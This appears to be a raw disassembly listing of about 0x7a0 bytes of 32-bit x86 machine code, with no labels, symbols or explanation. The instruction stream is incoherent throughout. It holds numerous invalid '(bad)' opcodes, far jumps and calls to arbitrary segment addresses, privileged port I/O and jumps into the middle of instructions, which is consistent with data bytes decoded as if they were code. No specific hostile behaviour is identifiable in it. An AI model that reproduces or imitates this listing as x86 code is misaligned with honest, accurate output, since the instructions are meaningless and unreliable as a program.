  411cb7:	xor    ch,BYTE PTR [esi]
  411cb9:	push   eax
  411cba:	and    eax,ecx
  411cbc:	push   0xa5377041
  411cc1:	leave  
  411cc2:	add    al,0x2
  411cc4:	cmp    esp,DWORD PTR [ebx]
  411cc6:	push   es
  411cc7:	pop    edi
  411cc8:	jne    0x411d34
  411cca:	jmp    0x52c2:0x79481235
  411cd1:	(bad)  
  411cd2:	lea    ebx,[edx+0x5b]
  411cd5:	xchg   ecx,eax
  411cd6:	mov    ecx,0x6cbd5954
  411cdb:	loop   0x411cab
  411cdd:	add    al,0x72
  411cdf:	add    ah,BYTE PTR [edi+0x38]
  411ce2:	dec    edx
  411ce3:	out    0x4e,al
  411ce5:	xor    BYTE PTR [eax-0x17],al
  411ce8:	ins    DWORD PTR es:[edi],dx
  411ce9:	push   es
  411cea:	xchg   ebx,eax
  411ceb:	aaa    
  411cec:	setne  BYTE PTR [esi]
  411cef:	cwde   
  411cf0:	add    al,0xd8
  411cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cf3:	popa   
  411cf4:	or     eax,0x43daed9c
  411cf9:	cmp    eax,0x74295b3c
  411cfe:	dec    edx
  411cff:	xchg   BYTE PTR [esi],ah
  411d01:	push   ebx
  411d02:	add    DWORD PTR [esi-0x19],ebx
  411d05:	cwde   
  411d06:	test   al,0x4
  411d08:	out    0xc2,eax
  411d0a:	push   eax
  411d0b:	inc    esi
  411d0c:	xchg   esi,eax
  411d0d:	adc    eax,DWORD PTR [eax-0x67]
  411d10:	xor    BYTE PTR [edi+edx*1-0x4e],bh
  411d14:	shl    DWORD PTR [eax-0x76631ebd],1
  411d1a:	add    bh,0x8f
  411d1d:	out    0x62,eax
  411d1f:	pop    esp
  411d20:	xchg   DWORD PTR [edi-0x63],ebx
  411d23:	(bad)  
  411d24:	into   
  411d25:	mov    esp,0x5b531203
  411d2a:	sub    BYTE PTR cs:[ebx+0x2179af71],ah
  411d31:	jmp    0x6be4:0x2a877ff9
  411d38:	addr16 pop esp
  411d3a:	cmp    al,0x28
  411d3c:	in     eax,dx
  411d3d:	inc    edx
  411d3e:	fs pop edx
  411d40:	stc    
  411d41:	push   edx
  411d42:	rcr    BYTE PTR [edx+eiz*2-0xbb71662],1
  411d49:	push   esi
  411d4a:	sbb    ebp,eax
  411d4c:	pop    edx
  411d4d:	mov    ch,BYTE PTR [esi+0x1f90b78]
  411d53:	test   BYTE PTR [edi-0x7],ah
  411d56:	pop    eax
  411d57:	push   esi
  411d58:	jb     0x411cdc
  411d5a:	xor    esi,DWORD PTR [ecx]
  411d5c:	inc    esi
  411d5d:	mov    ecx,0xf37c05e3
  411d62:	and    eax,DWORD PTR [ecx+0x34]
  411d65:	mov    al,ds:0x613cc93b
  411d6a:	std    
  411d6b:	test   eax,0x3b6fb30
  411d70:	or     al,0xca
  411d72:	push   eax
  411d73:	fs std 
  411d75:	pop    eax
  411d76:	ffreep st(5)
  411d78:	pop    edx
  411d79:	shl    BYTE PTR [ebx+0x15c7bf04],0x56
  411d80:	push   edx
  411d81:	es or  al,0x4d
  411d84:	sbb    BYTE PTR [edi+0x6d3faeb3],0x89
  411d8b:	mov    ds:0xe0f3d930,eax
  411d90:	push   cs
  411d91:	icebp  
  411d92:	inc    esp
  411d93:	rcl    DWORD PTR [esi+0x1767690],0x81
  411d9a:	ins    BYTE PTR es:[edi],dx
  411d9b:	adc    BYTE PTR [ebx-0x4f],dh
  411d9e:	push   ecx
  411d9f:	je     0x411dfe
  411da1:	jmp    FWORD PTR [esi-0x31e2932b]
  411da7:	sub    dl,dh
  411da9:	dec    esp
  411daa:	mov    eax,0xb001dad6
  411daf:	mov    bl,0x5e
  411db1:	cmp    al,0x6d
  411db3:	std    
  411db4:	std    
  411db5:	xor    DWORD PTR [eax],ebp
  411db7:	gs mov ecx,0xf505e861
  411dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dbe:	inc    esp
  411dbf:	inc    edx
  411dc0:	push   eax
  411dc1:	les    esp,FWORD PTR ds:0xf193a32e
  411dc7:	push   esp
  411dc8:	and    eax,0x3b6cf3a2
  411dcd:	bound  edx,QWORD PTR [ebp+0x301c796c]
  411dd3:	dec    esp
  411dd4:	jl     0x411e0f
  411dd6:	icebp  
  411dd7:	sar    ebx,0x3d
  411dda:	jne    0x411db2
  411ddc:	xchg   esi,eax
  411ddd:	movd   ebp,mm5
  411de0:	or     BYTE PTR [edi],ch
  411de2:	jge    0x411e58
  411de4:	les    ecx,FWORD PTR [eax]
  411de6:	shl    BYTE PTR [edi-0x12c4f3b4],1
  411dec:	inc    ecx
  411ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dee:	pop    ss
  411def:	mov    dh,0xec
  411df1:	add    DWORD PTR [edi-0x55929c78],edx
  411df7:	add    bh,BYTE PTR [edi+edi*8+0x694ec3e3]
  411dfe:	out    dx,al
  411dff:	fsqrt  
  411e01:	(bad)  
  411e02:	push   es
  411e03:	xchg   BYTE PTR ds:0x99d2748,ch
  411e09:	jno    0x411e75
  411e0b:	jle    0x411e0c
  411e0d:	push   es
  411e0e:	pop    esi
  411e0f:	push   es
  411e10:	cld    
  411e11:	xchg   esp,eax
  411e12:	sub    eax,0xdfed5e9a
  411e17:	jp     0x411df0
  411e19:	lahf   
  411e1a:	in     al,dx
  411e1b:	cdq    
  411e1c:	pop    edx
  411e1d:	int    0x42
  411e1f:	fiadd  WORD PTR [eax+0x25]
  411e22:	mov    eax,ds:0x1d8b04e
  411e27:	jp     0x411df9
  411e29:	ja     0x411e4c
  411e2b:	dec    ebp
  411e2c:	inc    ecx
  411e2d:	lods   eax,DWORD PTR ds:[esi]
  411e2e:	out    dx,al
  411e2f:	mov    dh,0x69
  411e31:	mov    ecx,0xd4d43f4a
  411e36:	cmp    DWORD PTR [ebx-0x24985b58],edi
  411e3c:	ret    0xbac1
  411e3f:	add    BYTE PTR [ebp+0x58],cl
  411e42:	jb     0x411e6b
  411e44:	addr16 add esp,ebx
  411e47:	sbb    dh,BYTE PTR ds:0x7e4c04b1
  411e4d:	push   ds
  411e4e:	rcl    BYTE PTR [edx],0xf3
  411e51:	sahf   
  411e52:	popf   
  411e53:	mov    ebp,0xd36933ae
  411e58:	ret    
  411e59:	pop    ds
  411e5a:	ins    BYTE PTR es:[edi],dx
  411e5b:	xchg   esi,eax
  411e5c:	in     eax,0xb7
  411e5e:	add    esi,DWORD PTR [edx+0x35]
  411e61:	adc    eax,0xb91009b6
  411e66:	mov    eax,DWORD PTR [ebx+0x3a]
  411e69:	xchg   DWORD PTR [ebx],ebp
  411e6b:	loope  0x411e01
  411e6d:	test   DWORD PTR ds:0xa4406e26,esp
  411e73:	fild   QWORD PTR [ecx-0x2d99fae0]
  411e79:	and    BYTE PTR [edi+0x70],cl
  411e7c:	xchg   esi,eax
  411e7d:	stc    
  411e7e:	adc    ecx,DWORD PTR [esi-0x5fa22136]
  411e84:	jmp    0x411edc
  411e86:	ss xor al,0xc7
  411e89:	jle    0x411e85
  411e8b:	push   ss
  411e8c:	pop    edi
  411e8d:	jecxz  0x411e71
  411e8f:	pusha  
  411e90:	jp     0x411e8b
  411e92:	fst    DWORD PTR gs:[ebx]
  411e95:	mov    bh,0x49
  411e97:	mov    WORD PTR [edx],gs
  411e99:	lods   al,BYTE PTR ds:[esi]
  411e9a:	dec    edx
  411e9b:	jne    0x411e80
  411e9d:	push   ss
  411e9e:	pushf  
  411e9f:	mov    dh,0x5f
  411ea1:	imul   ecx,DWORD PTR [ebx-0x4f],0x36
  411ea5:	cmp    BYTE PTR [eax-0x32],ah
  411ea8:	lods   eax,DWORD PTR ds:[esi]
  411ea9:	test   BYTE PTR [ebx],0x8b
  411eac:	addr16 or eax,0x643110b1
  411eb2:	ins    BYTE PTR es:[edi],dx
  411eb3:	shr    BYTE PTR [edi],0x78
  411eb6:	and    al,BYTE PTR [eax]
  411eb8:	pop    ebp
  411eb9:	shl    BYTE PTR [edi*4+0x30f19118],1
  411ec0:	jmp    0x859d:0xfcd68c8c
  411ec7:	stos   DWORD PTR es:[edi],eax
  411ec8:	pop    edx
  411ec9:	leave  
  411eca:	add    esi,ecx
  411ecc:	adc    cl,ch
  411ece:	inc    ebp
  411ecf:	mov    WORD PTR [eax],ss
  411ed1:	in     eax,0x9b
  411ed3:	shr    BYTE PTR [ebx-0x78],1
  411ed6:	pop    ds
  411ed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ed8:	cli    
  411ed9:	pop    esp
  411eda:	stos   BYTE PTR es:[edi],al
  411edb:	stos   DWORD PTR es:[edi],eax
  411edc:	(bad)
  411edf:	pop    esp
  411ee0:	or     eax,0x1360b3be
  411ee5:	mov    esi,edx
  411ee7:	mov    ah,0xe6
  411ee9:	xchg   ecx,eax
  411eea:	imul   ebx,DWORD PTR [edx+0x4febbc84],0x2e
  411ef1:	xor    al,0xaf
  411ef3:	lds    edi,FWORD PTR [esi+0x5e0db57f]
  411ef9:	sar    ah,cl
  411efb:	xchg   ecx,eax
  411efc:	bound  edi,QWORD PTR [ebp+eiz*2+0x5af3794d]
  411f03:	out    0x65,eax
  411f05:	cli    
  411f06:	sbb    DWORD PTR [ebx-0x498b48aa],ecx
  411f0c:	push   esp
  411f0d:	stos   BYTE PTR es:[edi],al
  411f0e:	xchg   esp,esp
  411f10:	mov    edi,ebp
  411f12:	inc    ebp
  411f13:	dec    edx
  411f14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f15:	mov    edi,0x3bfd3359
  411f1a:	xor    BYTE PTR [edx+0x2922a423],cl
  411f20:	ins    DWORD PTR es:[edi],dx
  411f21:	hlt    
  411f22:	jne    0x411eec
  411f24:	dec    eax
  411f25:	call   0x41ee:0xcf471f0f
  411f2c:	lods   eax,DWORD PTR ds:[esi]
  411f2d:	retf   0xd333
  411f30:	stc    
  411f31:	xchg   edx,eax
  411f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f33:	add    BYTE PTR [edx],ch
  411f35:	push   esi
  411f36:	push   edx
  411f37:	push   esi
  411f38:	push   0x83c0655b
  411f3d:	in     eax,dx
  411f3e:	out    dx,al
  411f3f:	pop    ebp
  411f40:	add    al,0x40
  411f42:	xor    BYTE PTR [esi+0x12],dh
  411f45:	jno    0x411f02
  411f47:	dec    BYTE PTR [ebx-0x2f208344]
  411f4d:	test   dl,dl
  411f4f:	sbb    esp,DWORD PTR [edi-0x5c7d7a9]
  411f55:	lea    edx,[ecx-0x6066769a]
  411f5b:	add    ebx,DWORD PTR [eax-0x4da1461f]
  411f61:	mov    ebp,0xf5c752e5
  411f66:	retf   0x586d
  411f69:	ror    DWORD PTR [eax],0x59
  411f6c:	xchg   ecx,eax
  411f6d:	es call 0x9c19:0x2902f25d
  411f75:	mov    ecx,0x29405e31
  411f7a:	test   eax,0x446515bb
  411f7f:	mov    eax,ds:0x7905c335
  411f84:	jno    0x411f5d
  411f86:	xchg   DWORD PTR [ebx-0x24b83038],ecx
  411f8c:	call   0x8484:0x6e0f8f32
  411f93:	dec    ebp
  411f94:	and    edx,ebp
  411f96:	daa    
  411f97:	ret    
  411f98:	loopne 0x411f7c
  411f9a:	jge    0x411ff6
  411f9c:	clc    
  411f9d:	xor    DWORD PTR [esi+0x15],eax
  411fa0:	ss ds cmc 
  411fa3:	pop    es
  411fa4:	mov    bh,0x31
  411fa6:	fwait
  411fa7:	and    BYTE PTR [eax],0x17
  411faa:	push   es
  411fab:	loopne 0x411fad
  411fad:	aas    
  411fae:	cld    
  411faf:	lds    ebx,FWORD PTR [esp+eax*4]
  411fb2:	pop    eax
  411fb3:	int3   
  411fb4:	js     0x411f37
  411fb6:	mov    edi,0x23cde052
  411fbb:	mov    ecx,edi
  411fbd:	retf   
  411fbe:	into   
  411fbf:	add    esi,DWORD PTR [esi]
  411fc1:	nop
  411fc2:	stc    
  411fc3:	jne    0x411f5c
  411fc5:	inc    ecx
  411fc6:	ret    0x7fe8
  411fc9:	arpl   WORD PTR [ebx],bp
  411fcb:	and    DWORD PTR [ecx+0x24184446],esi
  411fd1:	adc    DWORD PTR [eax],esp
  411fd3:	call   0xdc4a:0x24126aad
  411fda:	sbb    DWORD PTR [ebx],0x50
  411fdd:	mov    ds:0x9dd7127f,al
  411fe2:	daa    
  411fe3:	ret    0xefd4
  411fe6:	(bad)  
  411fe8:	pop    es
  411fe9:	add    al,0xa7
  411feb:	pusha  
  411fec:	xlat   BYTE PTR ds:[ebx]
  411fed:	ficom  WORD PTR [eax]
  411fef:	dec    ebp
  411ff0:	dec    edi
  411ff1:	xor    DWORD PTR [eax-0x14],edx
  411ff4:	push   edx
  411ff5:	inc    edx
  411ff6:	outs   dx,BYTE PTR ds:[esi]
  411ff7:	fiadd  DWORD PTR [ebx]
  411ff9:	fstp   TBYTE PTR [edi+ebx*4+0xe]
  411ffd:	test   ecx,edx
  411fff:	jecxz  0x41207e
  412001:	adc    eax,DWORD PTR [eax]
  412003:	mov    edx,0x369c14df
  412008:	ret    
  412009:	in     al,dx
  41200a:	cmp    eax,0x5ab6fa87
  41200f:	or     al,0x4c
  412011:	inc    edx
  412012:	add    ebp,ecx
  412014:	jnp    0x41208d
  412016:	loop   0x412062
  412018:	or     esi,DWORD PTR [ebx]
  41201a:	sub    ch,BYTE PTR [esi]
  41201c:	sub    DWORD PTR [esi],ebp
  41201e:	xchg   edi,eax
  41201f:	and    DWORD PTR [edi-0x76],ebx
  412022:	dec    ebp
  412023:	bnd jno 0x412004
  412026:	icebp  
  412027:	ins    DWORD PTR es:[edi],dx
  412028:	xor    esp,DWORD PTR [ebp-0x2f414a76]
  41202e:	sbb    dl,bh
  412030:	arpl   WORD PTR [esi],si
  412032:	clc    
  412033:	ja     0x41206d
  412035:	daa    
  412036:	dec    ecx
  412037:	jmp    0x411fbb
  412039:	xchg   ecx,eax
  41203a:	out    0x3c,eax
  41203c:	or     DWORD PTR [edx+0x2d],esi
  41203f:	jnp    0x412058
  412041:	ds ins DWORD PTR es:[edi],dx
  412043:	in     al,dx
  412044:	in     eax,0x7a
  412046:	cli    
  412047:	fdiv   QWORD PTR [ebx-0x15]
  41204a:	push   0xffffffe3
  41204c:	lods   al,BYTE PTR ds:[esi]
  41204d:	scas   eax,DWORD PTR es:[edi]
  41204e:	(bad)  
  41204f:	pusha  
  412050:	inc    ebx
  412051:	nop
  412052:	jl     0x41203f
  412054:	pop    ebx
  412055:	(bad)  
  412056:	sub    dh,BYTE PTR [ebx]
  412058:	int3   
  412059:	fs out dx,eax
  41205b:	in     al,dx
  41205c:	add    esi,DWORD PTR [ebx+ecx*1]
  41205f:	inc    esp
  412060:	and    bl,bl
  412062:	jmp    0x412007
  412064:	xchg   esi,eax
  412065:	xchg   esi,eax
  412066:	xchg   ebp,eax
  412067:	jne    0x411fec
  412069:	outs   dx,DWORD PTR ds:[esi]
  41206a:	xor    DWORD PTR [edi+edi*4-0x34],edi
  41206e:	iret   
  41206f:	dec    edx
  412070:	test   BYTE PTR [ebx-0xf],0xa8
  412074:	mov    ds:0x1f913c03,al
  412079:	xchg   ebx,eax
  41207a:	outs   dx,BYTE PTR ds:[esi]
  41207b:	fidiv  DWORD PTR [esi+0x6a]
  41207e:	fwait
  41207f:	bswap  esi
  412081:	arpl   WORD PTR [esi+0x3140fece],sp
  412087:	out    dx,eax
  412088:	dec    ecx
  412089:	push   ebx
  41208a:	hlt    
  41208b:	add    al,0xa4
  41208d:	mov    ds:0x83bff52a,eax
  412092:	out    0x84,eax
  412094:	and    BYTE PTR [esi+edi*4-0x1e],al
  412098:	nop
  412099:	dec    ebp
  41209a:	dec    eax
  41209b:	in     al,dx
  41209c:	cmp    BYTE PTR ds:0x68a2c22d,0xd8
  4120a3:	(bad)  
  4120a4:	xchg   edx,eax
  4120a5:	adc    DWORD PTR [esi+0xa],edi
  4120a8:	cs pop ss
  4120aa:	shr    BYTE PTR [edi+0x53],1
  4120ad:	test   esp,edi
  4120af:	scas   eax,DWORD PTR es:[edi]
  4120b0:	pushf  
  4120b1:	lods   al,BYTE PTR ds:[esi]
  4120b2:	push   esi
  4120b3:	xor    BYTE PTR [ebp+0x69],ah
  4120b6:	fdiv   QWORD PTR [edi]
  4120b8:	pop    ss
  4120b9:	or     DWORD PTR ds:0x602eccdf,ecx
  4120bf:	sbb    BYTE PTR [edi+eax*4-0xa55c5b4],0x74
  4120c7:	(bad)  
  4120c8:	loopne 0x41208b
  4120ca:	push   eax
  4120cb:	jne    0x4120f5
  4120cd:	xor    al,0xfe
  4120cf:	loopne 0x41209f
  4120d1:	mov    ah,al
  4120d3:	sti    
  4120d4:	popf   
  4120d5:	daa    
  4120d6:	sub    esp,esi
  4120d8:	lahf   
  4120d9:	int    0x1c
  4120db:	sti    
  4120dc:	push   ss
  4120dd:	push   0xb6e1cfa2
  4120e2:	push   ebp
  4120e3:	cmp    BYTE PTR [edi-0x3829da7f],bl
  4120e9:	adc    al,BYTE PTR [edi+edi*1-0x3a]
  4120ed:	out    dx,eax
  4120ee:	ret    
  4120ef:	mov    cl,0x98
  4120f1:	push   0x77cae4e
  4120f6:	adc    bh,BYTE PTR [ecx]
  4120f8:	test   BYTE PTR [esi+0x64],bl
  4120fb:	mov    BYTE PTR [ebx+0x3c],dh
  4120fe:	jae    0x41213e
  412100:	sbb    al,BYTE PTR [edi-0x6c]
  412103:	sar    BYTE PTR [ebx],0x48
  412106:	xor    al,0x24
  412108:	hlt    
  412109:	fiadd  WORD PTR [edi+0x79]
  41210c:	mov    eax,ds:0xa92b6e0c
  412111:	cmp    DWORD PTR [edi-0x28f7becd],ebx
  412117:	sti    
  412118:	mov    esp,0x9521b7c9
  41211d:	dec    edi
  41211e:	cld    
  41211f:	mov    bh,0x56
  412121:	adc    eax,0x1f065918
  412126:	xor    DWORD PTR [ebx+ebx*4-0x39],edi
  41212a:	aam    0x92
  41212c:	push   ds
  41212d:	cdq    
  41212e:	adc    bh,BYTE PTR [eax]
  412130:	push   edi
  412131:	push   esp
  412132:	sub    DWORD PTR [edi],edx
  412134:	xchg   esp,eax
  412135:	fdivr  QWORD PTR es:[esi-0x7e]
  412139:	and    ch,BYTE PTR [ecx]
  41213b:	push   esi
  41213c:	add    al,0xfa
  41213e:	push   ds
  41213f:	retf   0x8705
  412142:	mov    bh,BYTE PTR [eax+0x31375796]
  412148:	lds    ecx,FWORD PTR [ebp+0x4db00842]
  41214e:	xor    dl,BYTE PTR [edi]
  412150:	inc    sp
  412152:	push   ss
  412153:	in     eax,dx
  412154:	dec    edi
  412155:	or     BYTE PTR [eax+esi*8+0x3cc59e3],bh
  41215c:	push   cs
  41215d:	lea    ebx,[ecx-0xc53d171]
  412163:	imul   edx,DWORD PTR [eax-0x30706b4c],0xfffffffe
  41216a:	lods   al,BYTE PTR ds:[esi]
  41216b:	or     al,0x20
  41216d:	stos   DWORD PTR es:[edi],eax
  41216e:	es fs xchg bx,ax
  412172:	ficom  DWORD PTR [esi-0x2f39f681]
  412178:	popf   
  412179:	(bad)  
  41217a:	shl    DWORD PTR [edi],0xe1
  41217d:	or     ecx,DWORD PTR [ebx+0x31]
  412180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412181:	pop    ds
  412182:	push   0xf39b7269
  412187:	mov    edx,0x6ec2e48e
  41218c:	aaa    
  41218d:	pop    edx
  41218e:	mov    esp,0xc59e5587
  412193:	xchg   edx,eax
  412194:	sbb    al,0xa5
  412196:	xchg   ebp,eax
  412197:	in     al,dx
  412198:	in     al,0xa5
  41219a:	fdiv   QWORD PTR [edx-0xbaef158]
  4121a0:	(bad)  
  4121a1:	repz jno 0x41215c
  4121a4:	or     DWORD PTR [eax-0x39],edx
  4121a7:	aas    
  4121a8:	adc    dh,ah
  4121aa:	sbb    eax,edx
  4121ac:	inc    esp
  4121ad:	cmp    esp,DWORD PTR [edi-0x6f]
  4121b0:	ins    BYTE PTR es:[edi],dx
  4121b1:	mov    esp,0x9d9bb520
  4121b6:	inc    edx
  4121b7:	popa   
  4121b8:	loop   0x41222e
  4121ba:	sbb    DWORD PTR [ebx-0x92dcb16],ecx
  4121c0:	xchg   BYTE PTR [edi],bh
  4121c2:	pushf  
  4121c3:	mov    esp,0x4e634935
  4121c8:	and    DWORD PTR [esi-0x4b],0xf033d4a6
  4121cf:	sbb    BYTE PTR [esi+0x6c],al
  4121d2:	lea    ebx,[ebx]
  4121d4:	imul   ebp,ecx,0xabd47be8
  4121da:	add    BYTE PTR [eax+edx*8+0x218fa74],ah
  4121e1:	or     esp,DWORD PTR [edi]
  4121e3:	or     al,BYTE PTR [edx+0x48]
  4121e6:	xor    edi,DWORD PTR [edx]
  4121e8:	xchg   ebp,eax
  4121e9:	adc    cl,BYTE PTR [ebp+0x12]
  4121ec:	out    0xbc,al
  4121ee:	fistp  QWORD PTR [eax+0x11]
  4121f1:	pop    eax
  4121f2:	inc    ecx
  4121f3:	mov    edi,0xa915b96b
  4121f8:	pop    ecx
  4121f9:	jecxz  0x412259
  4121fb:	or     ecx,DWORD PTR [ebx+0x6e]
  4121fe:	jno    0x412227
  412200:	adc    DWORD PTR [ecx+0x4f52095],eax
  412206:	repnz or al,0x4c
  412209:	push   ss
  41220a:	mov    cl,0xc1
  41220c:	xchg   edx,eax
  41220d:	repnz lods eax,DWORD PTR ds:[esi]
  41220f:	xor    BYTE PTR [eax],ah
  412211:	xchg   DWORD PTR [esi],ecx
  412213:	mov    ebp,0x8890015c
  412218:	mov    edi,0xf35c9338
  41221d:	add    ebp,0xffffffd8
  412220:	push   0xffffffb5
  412222:	pop    edx
  412223:	scas   eax,DWORD PTR es:[edi]
  412224:	pop    esi
  412225:	(bad)  
  412226:	ins    BYTE PTR es:[edi],dx
  412227:	mov    ah,BYTE PTR [edi+eiz*4+0x338ac020]
  41222e:	xor    eax,0x7e5b11da
  412233:	jo     0x412293
  412235:	sbb    esi,DWORD PTR [eax]
  412237:	mov    dl,BYTE PTR [esi+0x344b2adc]
  41223d:	retf   0xf12e
  412240:	test   DWORD PTR [esp+edx*2],edx
  412243:	cmc    
  412244:	and    cl,BYTE PTR [esi-0x3b48354f]
  41224a:	in     eax,0xea
  41224c:	cmp    dh,BYTE PTR [ebx]
  41224e:	inc    eax
  41224f:	inc    esi
  412250:	leave  
  412251:	popa   
  412252:	xor    BYTE PTR [esi],ch
  412254:	and    DWORD PTR [eax+0x50],esi
  412257:	int3   
  412258:	fldenv [ebp-0x72]
  41225b:	mov    WORD PTR [edx+0x24],ds
  41225e:	mov    eax,0x431d0ca9
  412263:	cmp    BYTE PTR [ecx+0x138e64fb],0x5f
  41226a:	jo     0x4121f7
  41226c:	retf   0xbd2a
  41226f:	jnp    0x412286
  412271:	push   cs
  412272:	dec    eax
  412273:	pushf  
  412274:	xor    dl,BYTE PTR [edi]
  412276:	test   eax,0xd62d317a
  41227b:	mov    cl,0xc1
  41227d:	mov    eax,ds:0xf025726e
  412282:	pop    ebx
  412283:	sbb    dh,bl
  412285:	xor    al,0xe5
  412287:	fnstenv [edx-0x25]
  41228a:	jmp    0x412282
  41228c:	mov    WORD PTR [edi-0x3e],?
  41228f:	mov    edi,0x33e5658d
  412294:	out    dx,al
  412295:	jne    0x412249
  412297:	leave  
  412298:	aaa    
  412299:	xor    bh,BYTE PTR [esi]
  41229b:	mov    edx,0x65ffdb29
  4122a0:	mov    esp,fs
  4122a2:	in     eax,0xd0
  4122a4:	lock mov eax,ds:0xf30adbaa
  4122aa:	mov    ah,0xdd
  4122ac:	scas   eax,DWORD PTR es:[edi]
  4122ad:	mov    ah,0x9e
  4122af:	xor    eax,0x9b0fb3cd
  4122b4:	dec    edx
  4122b5:	lea    eax,[edx-0x669fad85]
  4122bb:	retf   
  4122bc:	inc    edx
  4122bd:	in     al,0x4c
  4122bf:	inc    ebp
  4122c0:	arpl   WORD PTR [ecx+0x7c881449],bx
  4122c6:	adc    eax,0xe1d8e124
  4122cb:	outs   dx,BYTE PTR ds:[esi]
  4122cc:	jmp    0x6ca:0xf6222f96
  4122d3:	push   esp
  4122d4:	bound  edx,QWORD PTR [edx]
  4122d6:	ret    
  4122d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122d9:	sbb    al,BYTE PTR [edx+edx*4+0xb]
  4122dd:	rcr    esp,cl
  4122df:	lds    ecx,FWORD PTR [esi+ebx*2]
  4122e2:	dec    edi
  4122e3:	ins    BYTE PTR es:[edi],dx
  4122e4:	jl     0x4122a5
  4122e6:	iret   
  4122e7:	mov    esp,0x25548022
  4122ec:	dec    eax
  4122ed:	jae    0x4122f2
  4122ef:	scas   eax,DWORD PTR es:[edi]
  4122f0:	pop    edi
  4122f1:	push   esp
  4122f2:	aam    0xd8
  4122f4:	or     al,BYTE PTR [ecx]
  4122f6:	or     DWORD PTR [esi-0x64],esi
  4122f9:	push   edx
  4122fa:	xchg   edi,eax
  4122fb:	pushf  
  4122fc:	ins    DWORD PTR es:[edi],dx
  4122fd:	dec    ebx
  4122fe:	add    BYTE PTR [edx+0x70611772],bh
  412304:	xchg   ebx,eax
  412305:	sub    al,al
  412307:	jmp    0x4122e3
  412309:	jnp    0x41230c
  41230b:	pop    ebx
  41230c:	push   edx
  41230d:	shr    BYTE PTR [eax],1
  41230f:	shl    DWORD PTR [ecx+esi*1+0x3ae94c6b],0xa5
  412317:	ds popa 
  412319:	aam    0x48
  41231b:	sbb    DWORD PTR [ecx+0xf18998e],0x92c199c2
  412325:	mov    eax,0xf25b7e8a
  41232a:	and    edi,DWORD PTR [edx+ebp*1+0x1b8df01f]
  412331:	in     al,0x15
  412333:	sbb    ebp,edx
  412335:	arpl   WORD PTR [eax-0x21dd1351],bx
  41233b:	mov    ah,0xf2
  41233d:	add    ecx,DWORD PTR [ebp-0x7d94abd6]
  412343:	or     ch,BYTE PTR [ebp+0x2bb7cfb6]
  412349:	loopne 0x412367
  41234b:	int3   
  41234c:	adc    ebx,ecx
  41234e:	das    
  41234f:	lds    edi,FWORD PTR [ebx+esi*8-0x5b9dcf07]
  412356:	cmp    eax,0xbb54d55
  41235b:	mov    eax,0xe577548b
  412360:	xor    al,0x30
  412362:	mov    cl,0x64
  412364:	cmp    BYTE PTR [ebx-0x3558f5d9],bh
  41236a:	mov    al,ds:0xa6bc5e05
  41236f:	je     0x41239f
  412371:	sub    bh,BYTE PTR [edx]
  412373:	mov    WORD PTR [ebp+ebp*4-0x1ff1e092],?
  41237a:	test   BYTE PTR [ecx],0xcc
  41237d:	pop    ecx
  41237e:	vcomisd xmm1,QWORD PTR [ecx]
  412382:	mov    cl,0x12
  412384:	jmp    0x4123ff
  412386:	ror    DWORD PTR [edx+ecx*4],0xc8
  41238a:	imul   edx,edi,0x3d
  41238d:	pop    ebx
  41238e:	(bad)  
  41238f:	call   0x3cf18d82
  412394:	or     al,0xa2
  412396:	(bad)  
  412397:	stc    
  412398:	retf   0x76a
  41239b:	shr    bh,0xc2
  41239e:	out    0x4a,al
  4123a0:	ja     0x41235f
  4123a2:	or     bh,BYTE PTR [esi+0x41]
  4123a5:	test   BYTE PTR [edi],0x54
  4123a8:	mov    ecx,0x41b6951f
  4123ad:	inc    eax
  4123ae:	(bad)  
  4123b0:	jl     0x412351
  4123b2:	fisubr WORD PTR [ebx+0x337728b1]
  4123b8:	pop    ds
  4123b9:	push   ebp
  4123ba:	fwait
  4123bb:	stos   BYTE PTR es:[edi],al
  4123bc:	and    eax,0x8b9ed13b
  4123c1:	test   al,0xe4
  4123c3:	aaa    
  4123c4:	and    eax,0x937d9737
  4123c9:	xchg   ebp,eax
  4123ca:	out    0x43,al
  4123cc:	sbb    ebx,edi
  4123ce:	dec    ebp
  4123cf:	jae    0x4123af
  4123d1:	jle    0x4123ef
  4123d3:	push   cs
  4123d4:	retf   0xdc1b
  4123d7:	pushf  
  4123d8:	paddw  mm3,QWORD PTR [esi]
  4123db:	lods   al,BYTE PTR ds:[esi]
  4123dc:	arpl   WORD PTR [edi+0x33],dx
  4123df:	out    dx,al
  4123e0:	pop    edi
  4123e1:	rcr    DWORD PTR [edx+eax*8-0x7a],0xc2
  4123e6:	push   cs
  4123e7:	mov    eax,ds:0xc8b3dd46
  4123ec:	jle    0x4123f1
  4123ee:	push   edi
  4123ef:	outs   dx,DWORD PTR ds:[esi]
  4123f0:	and    esi,DWORD PTR cs:0x875791d5
  4123f7:	addr16 ja 0x4123df
  4123fa:	sub    eax,0x5fc63841
  4123ff:	dec    eax
  412400:	repnz sub edi,DWORD PTR [esi-0x1537a6d1]
  412407:	repz ds int 0x7
  41240b:	mov    bl,0x3b
  41240d:	xchg   ebp,eax
  41240e:	lds    ecx,FWORD PTR [eax-0x5b]
  412411:	inc    edx
  412413:	mov    esi,0x584d83d8
  412418:	xlat   BYTE PTR ds:[ebx]
  412419:	inc    ecx
  41241a:	pop    ecx
  41241b:	fwait
  41241c:	mov    DWORD PTR [eax],edx
  41241e:	xchg   ebp,eax
  41241f:	call   0xaf0c:0xfcf0ab58
  412426:	adc    eax,0x384fc040
  41242b:	test   edi,edi
  41242d:	ins    DWORD PTR es:[edi],dx
  41242e:	and    bh,BYTE PTR [ebx]
  412430:	ins    DWORD PTR es:[edi],dx
  412431:	call   0xe5d3:0x83d772ee
  412438:	imul   esp,DWORD PTR [edx],0x5f7f3209
  41243e:	pop    ds
  41243f:	popa   
  412440:	data16 shl bl,1
  412443:	fnsave [esi+0x44]
  412446:	aaa    
  412447:	adc    ebx,esi
  412449:	iret   
  41244a:	lds    ecx,FWORD PTR [edx+0x5e4645a3]
  412450:	xor    eax,0x1e36822a
  412455:	xchg   ebp,ebp
  412457:	jg     0x412453
